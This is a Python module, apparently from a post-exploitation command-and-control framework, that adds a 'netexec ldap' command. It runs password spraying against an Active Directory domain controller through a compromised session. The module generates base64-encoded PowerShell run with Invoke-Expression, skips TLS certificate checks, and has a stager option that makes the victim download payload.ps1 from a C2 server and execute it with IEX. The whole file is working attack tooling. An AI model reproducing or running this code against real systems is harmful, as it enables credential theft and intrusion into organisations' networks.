import argparse
import sys
import os
import subprocess
import base64

from core.gunnershell.commands.base import register, Command
from core import stager_server as stage
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

@register("netexec ldap", "nxc ldap")
class NetexecLdapCommand(Command):
	"""LDAP bind and enumeration against a DC"""

	@property
	def help(self):
		return "netexec ldap -u <userfile> -p <passfile> -d <domain> -dc <dc> [flags]    LDAP auth and enum"

	def execute(self, args):
		parser = argparse.ArgumentParser(prog="netexec_ldap", add_help=False)
		parser.add_argument('-u','--users',  dest='userfile', required=True, help='Username or file')
		parser.add_argument('-p','--passes', dest='passfile', required=True, help='Password or file')
		parser.add_argument('-d','--domain', dest='domain',   required=True, help='AD domain name')
		parser.add_argument('--dc',         dest='dc',       required=True, help='Domain Controller host')
		parser.add_argument('--ldaps',      action='store_true', dest='ldaps', help='Use LDAPS instead of LDAP')
		parser.add_argument('--port',       type=int, dest='port', help='Port for LDAP/LDAPS')
		parser.add_argument('--debug',      action='store_true', dest='debug', help='Enable verbose output')
		parser.add_argument('--stager',      action='store_true', dest='stager', help='Download & execute payload.ps1 from C2')
		parser.add_argument('--stager-port', dest='stager_port', type=int, default=8000, help='HTTP stager port (default:8000)')
		parser.add_argument('--stager-ip',   dest='stager_ip', help='IP to fetch stager payload from')

		try:
			opts = parser.parse_args(args)
		except SystemExit:
			print(brightyellow + self.help)
			return

		out = self.logic(
			self.gs.sid,
			opts.userfile,
			opts.passfile,
			opts.domain,
			opts.dc,
			stage_ip   = opts.stager_ip,
			ldaps      = opts.ldaps,
			port       = opts.port,
			debug      = opts.debug,
			stager     = opts.stager,
			stage_port = opts.stager_port,
			op_id      = self.op_id
		)

		if out:
			print(brightgreen + out if "[!]" not in out else out)

		else:
			print(brightyellow + "[*] No output")

	def logic(self, sid, userfile, passfile, domain, dc, stage_ip=None, ldaps=False, port=None, debug=False, stager=False, stage_port=8000, op_id="console"):
		if os.path.isfile(userfile):
			with open(userfile, 'r') as f:
				users = [u.strip() for u in f if u.strip()]
		else:
			users = [userfile]

		if os.path.isfile(passfile):
			with open(passfile, 'r') as f:
				passes = [p.strip() for p in f if p.strip()]
		else:
			passes = [passfile]

		users_ps = "@(" + ",".join(f"'{u}'" for u in users) + ")"
		passes_ps = "@(" + ",".join(f"'{p}'" for p in passes) + ")"
		#print(port)

		if port:
			port = port

		else:
			port = 389

		if ldaps and port == 389:
			port = 636

		elif not ldaps and port == 389:
			port = 389

		if port:
			if port not in ("389", "636", "3268", "3269"):
				gc = "$true"

			else:
				gc = "$false"

		if not gc:
			gc = "$false"

		if not ldaps:
			ps = f"""
$Users = {users_ps}
$Passes = {passes_ps}
$Domain = '{domain}'
$DC = '{dc}'
$Port = {port}

foreach ($U in $Users) {{
  foreach ($P in $Passes) {{
	try {{
	  $sec = ConvertTo-SecureString $P -AsPlainText -Force
	  $cred = New-Object System.Management.Automation.PSCredential ("$Domain\\$U", $sec)

	  # Prefer AD module
	  if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {{
		Get-ADUser -Filter * -Server $($DC):$Port -Credential $cred -ResultSetSize 1 -ErrorAction SilentlyContinue | Out-Null
		Write-Output $("LDAP        {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $DC, $Domain, $U, $P)
	  }} else {{
		# Native LDAP query fallback
		$dn = ([ADSI]"LDAP://RootDSE").defaultNamingContext
		$CurrentDomain = "LDAP://$($DC):$Port/$dn"
		$domainobj = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$U,$P)
		if ($domainobj.name -eq $null) {{ }}
		else {{ Write-Output $("LDAP        {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $DC, $Domain, $U, $P) }}
	  }}
	}} catch {{
		try {{
		  $dn = ([ADSI]"LDAP://RootDSE").defaultNamingContext
		  $server = "$($DC):$Port"
		  $CurrentDomain = "LDAP://$server/$dn"
		  $domainobj = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$U,$P)
		  if ($domainobj.name -eq $null) {{ }}
		  else {{ Write-Output $("LDAP        {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $DC, $Domain, $U, $P) }}
		}}
		catch {{ }}
	}}
  }}
}}
"""
	
		if ldaps:
			ps = f"""
$Users   = {users_ps}
$Passes  = {passes_ps}
$Domain  = '{domain}'
$DC      = '{dc}'
$Port    = {port}
$GC = {gc}
$ldapsPorts = @(636, 3269)

foreach ($U in $Users) {{
  foreach ($P in $Passes) {{
	try {{
	  $sec  = ConvertTo-SecureString $P -AsPlainText -Force
	  $cred = New-Object System.Management.Automation.PSCredential("$Domain\\$U", $sec)

	  # 1) Try AD module if available
	  if ($ldapsPorts -contains $Port) {{
		if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {{
		  try {{
			Get-ADUser -Filter * -Server "$($DC):$Port" -Credential $cred -ResultSetSize 1 -ErrorAction Stop | Out-Null
			Write-Output $("LDAPS       {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $DC, $Domain, $U, $P)
			continue
		  }} catch {{
			
		  }}
		}}
	  }}

	  # 2) Fallback: native LDAPS bind via LdapConnection
	  try {{
		[Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
		if ($GC) {{ $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DC, $Port, $true, $false)}} 
		else {{ $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DC, $Port, $false, $false) }}
		$ldap = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)
		
		$ldap.SessionOptions.VerifyServerCertificate = {{ param($c,$cert) return $true }}
		$ldap.SessionOptions.ProtocolVersion   = 3
		$ldap.SessionOptions.SecureSocketLayer = $true

		$ldap.AuthType   = [System.DirectoryServices.Protocols.AuthType]::Negotiate
		$ldap.Credential = New-Object System.Net.NetworkCredential($U, $P, $Domain)
		
		$ldap.Bind()

		Write-Output $("LDAPS       {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $DC, $Domain, $U, $P)
	  }} catch {{
		
	  }}

	}} catch {{
	  
	}}
  }}
}}
"""

		b64 = base64.b64encode(ps.encode('utf-16le')).decode()
		one_liner = (
			"$ps = [System.Text.Encoding]::Unicode"
			f".GetString([Convert]::FromBase64String(\"{b64}\")); "
			"Invoke-Expression $ps"
		)

		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + "[!] Invalid session"

		transport = sess.transport.lower()

		if stager:
			u = f"http://{stage_ip}:{stage_port}/payload.ps1"
			ps_cmd = (
				f"$u='{u}';"
				"$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
				"$xml.open('GET',$u,$false);"
				"$xml.send();"
				"IEX $xml.responseText"
			)

			stage.start_stager_server(stage_port, ps)

			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, ps_cmd, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

			else:
				return brightred + "[!] Unknown session transport!"

		else:
			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)
			else:
				return brightred + "[!] Unsupported transport"

		if out:
			if "LDAP" in out or "LDAPS" in out:
				return out

			elif "LDAP" not in out and "LDAPS" not in out:
				return brightred + "[!] No valid credentials found"

			elif "LDAP" not in out and "LDAPS" not in out and debug:
				return out

		elif not out:
			return brightred + "[!] No valid credentials found"

		elif not out and debug:
			return out
		